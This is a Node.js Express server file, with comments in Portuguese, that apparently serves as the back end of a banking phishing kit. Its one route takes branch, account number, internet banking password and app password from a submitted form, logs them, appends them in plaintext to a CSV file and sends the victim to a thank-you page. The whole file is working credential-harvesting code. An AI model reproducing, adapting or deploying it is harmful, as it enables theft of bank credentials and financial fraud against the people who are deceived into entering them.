const express = require("express");
const multer = require("multer");
const { createObjectCsvWriter } = require("csv-writer");
const path = require("path");

const app = express();
const upload = multer();

// Configuração do CSV writer
const csvWriter = createObjectCsvWriter({
  path: "dados_formulario.csv",
  header: [
    { id: "titularidade", title: "Titularidade" },
    { id: "tipo_conta", title: "Tipo de Conta" },
    { id: "agencia", title: "Agência" },
    { id: "conta", title: "Conta" },
    { id: "senhaInternet", title: "Senha da Internet" },
    { id: "senhaApp", title: "Senha Digital" },
  ],
  append: true, // Adiciona os dados ao invés de sobrescrever o arquivo
});

// Middleware para servir arquivos estáticos (HTML, CSS, etc.)
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));

// Rota para processar o formulário
app.post("/processa_formulario", upload.none(), async (req, res) => {
  const { titularidade, tipo_conta, agency, login, internet, app } = req.body;

  console.log("Dados recebidos:", req.body);

  if (!agency || !login || !internet || !app) {
    return res.status(400).send("Todos os campos são obrigatórios.");
  }

  const data = [
    {
      titularidade,
      tipo_conta,
      agencia: agency,
      conta: login,
      senhaInternet: internet,
      senhaApp: app,
    },
  ];

  try {
    await csvWriter.writeRecords(data);
    res.redirect("/agradecimento.html");
  } catch (err) {
    console.error("Erro ao salvar os dados:", err);
    res.status(500).send("Erro ao salvar os dados.");
  }
});

// Inicia o servidor na porta 3000
app.listen(3000, () => {
  console.log("Servidor rodando em http://localhost:3000");
});
